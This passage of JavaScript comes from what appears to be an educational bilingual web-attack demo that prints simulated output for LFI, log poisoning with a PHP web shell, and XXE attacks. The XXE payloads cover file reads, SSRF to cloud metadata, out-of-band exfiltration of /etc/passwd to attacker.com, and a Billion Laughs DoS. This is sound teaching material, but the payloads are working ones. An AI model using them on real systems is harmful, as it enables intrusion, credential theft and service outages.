      await L.log('www-data:!:18000::::::', 'recv', 100);
      await L.log(t('→ Hashes crackeables con hashcat/john', '→ Hashes crackable with hashcat/john'), 'danger', 300);
    } else if (target === 'config') {
      await L.log('<?php', 'code', 100);
      await L.log('define("DB_HOST", "127.0.0.1");', 'recv', 100);
      await L.log('define("DB_USER", "webapp");', 'attack', 200);
      await L.log('define("DB_PASS", "S3cr3t_DB_P@ss!");', 'attack', 300);
      await L.log('define("DB_NAME", "produccion_db");', 'attack', 200);
      await L.log('define("SECRET_KEY", "a1b2c3d4e5f6...");', 'attack', 200);
      await L.log('?>', 'code', 100);
      await L.log(t('→ Credenciales de base de datos expuestas', '→ Database credentials exposed'), 'danger', 300);
    } else {
      await L.log('192.168.1.50 - - [01/Jun/2025] "GET /page?file=about HTTP/1.1" 200 -', 'recv', 100);
      await L.log('10.0.0.1 - - [01/Jun/2025] "GET /login HTTP/1.1" 200 -', 'recv', 100);
      await L.log('10.0.0.2 - - [01/Jun/2025] "GET / HTTP/1.1" 200 - "<?php system($_GET[\'cmd\']); ?>"', 'attack', 300);
      await L.log('', 'info', 50);
      await L.log('[ LOG POISONING → RCE ]', 'header', 200);
      await L.log(`GET ${base}?file=${f.traversal}&cmd=id`, 'code', 300);
      await L.log('uid=33(www-data) gid=33(www-data) groups=33(www-data)', 'danger', 400);
    }

    await L.log('', 'info', 50);
    await L.log('MITRE: T1083 File Discovery · T1059 Command Execution', 'info', 200);
  }

  async function runXXE() {
    const type = document.getElementById('xxe-type').value;
    const L = createLogger('xxe-output');
    L.clear();

    await L.log('=== XML EXTERNAL ENTITY (XXE) ===', 'header', 0);
    await L.log(t(`Tipo: ${type}`, `Type: ${type}`), 'warn', 100);
    await L.log('', 'info', 50);

    if (type === 'file') {
      await L.log('[ PAYLOAD — File Read ]', 'header', 200);
      await L.log('<?xml version="1.0"?>', 'code', 150);
      await L.log('<!DOCTYPE foo [', 'code', 100);
      await L.log('  <!ENTITY xxe SYSTEM "file:///etc/passwd">', 'attack', 300);
      await L.log(']>', 'code', 100);
      await L.log('<root><data>&xxe;</data></root>', 'code', 200);
      await L.log('', 'info', 50);
      await L.log(t('[ RESPUESTA DEL SERVIDOR ]', '[ SERVER RESPONSE ]'), 'header', 300);
      await L.log('HTTP/1.1 200 OK', 'recv', 200);
      await L.log('<root><data>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...</data></root>', 'attack', 400);
      await L.log(t('⚠ Contenido de /etc/passwd incluido en la respuesta', '⚠ /etc/passwd content included in the response'), 'danger', 300);
    } else if (type === 'ssrf') {
      await L.log('[ PAYLOAD — SSRF via XXE ]', 'header', 200);
      await L.log('<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">', 'attack', 300);
      await L.log('<root><data>&xxe;</data></root>', 'code', 200);
      await L.log('', 'info', 50);
      await L.log(t('[ RESPUESTA ]', '[ RESPONSE ]'), 'header', 300);
      await L.log('ami-id\nami-launch-index\nhostname\niam/\ninstance-id\nlocal-ipv4', 'attack', 400);
      await L.log(t('⚠ Metadata AWS accesible desde el servidor via XXE', '⚠ AWS metadata accessible from the server via XXE'), 'danger', 300);
    } else if (type === 'oob') {
      await L.log(t('[ PAYLOAD — Out-of-Band Exfiltración ]', '[ PAYLOAD — Out-of-Band Exfiltration ]'), 'header', 200);
      await L.log('<!ENTITY % file SYSTEM "file:///etc/passwd">', 'code', 200);
      await L.log('<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">', 'attack', 300);
      await L.log('%dtd;', 'code', 200);
      await L.log('', 'info', 50);
      await L.log(t('evil.dtd en attacker.com:', 'evil.dtd on attacker.com:'), 'header', 200);
      await L.log('<!ENTITY % send "<!ENTITY send SYSTEM \'http://attacker.com/?d=%file;\'>">', 'attack', 300);
      await L.log('%send; &send;', 'code', 200);
      await L.log('', 'info', 50);
      await L.log(t('[ LOG EN attacker.com ]', '[ LOG ON attacker.com ]'), 'header', 300);
      await L.log('GET /?d=root:x:0:0:root:/root:/bin/bash... HTTP/1.1', 'danger', 400);
      await L.log(t('⚠ Datos exfiltrados via DNS/HTTP sin respuesta visible', '⚠ Data exfiltrated via DNS/HTTP with no visible response'), 'danger', 300);
    } else {
      await L.log('[ PAYLOAD — Billion Laughs DoS ]', 'header', 200);
      await L.log('<!ENTITY a "lol">', 'code', 100);
      await L.log('<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">', 'code', 150);
      await L.log('<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">', 'code', 150);
      await L.log(t('...  (10 niveles)', '...  (10 levels)'), 'code', 100);
      await L.log('<!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">', 'code', 150);
      await L.log('<root>&j;</root>', 'code', 200);
      await L.log('', 'info', 50);
      await L.log(t('Expansiones: 10^10 = 10,000,000,000 "lol"', 'Expansions: 10^10 = 10,000,000,000 "lol"'), 'attack', 300);
      await L.log(t('Memoria requerida: ~3 GB para expandir', 'Memory required: ~3 GB to expand'), 'danger', 300);
      await L.log(t('Resultado: OutOfMemoryError → servidor caído', 'Result: OutOfMemoryError → server down'), 'danger', 400);
      await L.log(t('⚠ DoS con un payload de solo ~1KB', '⚠ DoS with a payload of only ~1KB'), 'danger', 300);
    }

    await L.log('', 'info', 50);
    await L.log('MITRE: T1190 Exploit Public-Facing Application', 'info', 200);
  }

  return { sendRequest, runXSS, runSQLi, resetSQLi, loadSQLiVariant, reset,
           runCSRFLegit, runCSRFAttack, runSessionHijack, resetSession,
           runSSRF, resetSSRF, runLFI, resetLFI, runXXE, resetXXE };

})();

window.httpDemo = httpDemo;
